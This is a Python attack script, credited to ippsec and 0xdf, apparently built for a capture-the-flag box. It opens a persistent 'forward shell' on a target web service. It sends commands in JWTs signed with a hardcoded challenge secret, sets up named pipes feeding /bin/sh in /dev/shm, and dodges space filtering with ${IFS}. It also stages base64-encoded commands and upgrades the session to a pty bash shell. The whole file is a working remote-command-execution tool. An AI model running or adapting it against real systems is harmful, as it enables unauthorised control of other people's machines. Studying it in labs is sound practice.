#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Forward Shell Skeleton code that was used in IppSec's Stratosphere Video
# -- https://www.youtube.com/watch?v=uMwcJQcUnmY
# Authors: ippsec, 0xdf


import base64
import random
import requests
import threading
import time
import jwt


class WebShell(object):

    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    def __init__(self, interval=1.3):
        # MODIFY THIS, URL
        self.url = r"http://172.16.1.22:3000"
        session = random.randrange(10000, 99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = interval

        # set up shell
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        MakeNamedPipes = MakeNamedPipes.replace(' ', '${IFS}')
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    # Read $session, output text to screen & wipe session
    def ReadThread(self):
        GetOutput = f"/bin/cat {self.stdout}"
        GetOutput = GetOutput.replace(' ', '${IFS}')
        while True:
            result = self.RunRawCmd(GetOutput)  # , proxy=None)
            if result:
                print(result)
                ClearOutput = f'echo -n "" > {self.stdout}'
                ClearOutput = ClearOutput.replace(' ', '${IFS}')
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)

    # Execute Command.
    def RunRawCmd(self, cmd, timeout=50):
        #print(f"Going to run cmd: {cmd}")
        # MODIFY THIS: This is where your payload code goes
        payload = {'cmd': cmd}
        token = jwt.encode(
            payload, 'hope you enjoy this challenge -ippsec', algorithm='HS256')
        headers = {'Authorization': 'Bearer {}'.format(token.decode())}

        try:
            r = requests.get(self.url, headers=headers, timeout=timeout)
            return r.text
        except:
            pass

    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(
            cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        stage_cmd = stage_cmd.replace(' ', '${IFS}')
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
        UpgradeShell = UpgradeShell.replace(' ', '${IFS}')
        print(UpgradeShell)
        self.WriteCmd(UpgradeShell)


prompt = "Please Subscribe> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)